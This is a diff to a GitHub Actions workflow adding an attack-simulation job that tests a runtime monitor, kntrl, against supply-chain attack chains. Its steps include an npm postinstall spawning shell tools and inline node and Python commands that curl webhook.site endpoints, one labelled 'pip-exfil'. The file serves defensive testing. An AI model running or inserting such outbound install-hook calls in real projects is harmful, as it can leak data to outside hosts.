@@ -80,3 +80,48 @@ jobs:
 
       - uses: kondukto-io/kntrl-action/stop@v1
         if: always()
+
+  # ──────────────────────────────────────────────
+  # Job 3: Attack simulation — blocked chain executions
+  # ──────────────────────────────────────────────
+  attack-sim:
+    name: "Trace mode (attack simulation)"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: kondukto-io/kntrl-action@v1
+        with:
+          mode: trace
+          allowed_hosts: "api.github.com"
+
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      # Simulate malicious postinstall: npm → curl, npm → wget, npm → python, npm → bash, npm → sh
+      - name: "Attack sim: malicious npm postinstall"
+        run: cd attack-sim && npm install --ignore-scripts=false
+        continue-on-error: true
+
+      # Simulate npm → node → curl chain (inline)
+      - name: "Attack sim: node child spawns curl"
+        run: node -e "try { require('child_process').execSync('curl -s --max-time 3 https://webhook.site/test', {stdio:'inherit'}) } catch(e) { console.log('Blocked:', e.message.split('\n')[0]) }"
+        continue-on-error: true
+
+      # Simulate npm → node → python chain (inline)
+      - name: "Attack sim: node child spawns python"
+        run: node -e "try { require('child_process').execSync('python3 -c \"print(\\\"credential-steal-sim\\\")\"', {stdio:'inherit'}) } catch(e) { console.log('Blocked:', e.message.split('\n')[0]) }"
+        continue-on-error: true
+
+      # Simulate pip → curl chain
+      - name: "Attack sim: pip setup.py spawns curl"
+        run: python3 -c "import subprocess; subprocess.run(['curl', '-s', '--max-time', '3', 'https://webhook.site/pip-exfil'])"
+        continue-on-error: true
+
+      - uses: kondukto-io/kntrl-action/stop@v1
+        if: always()
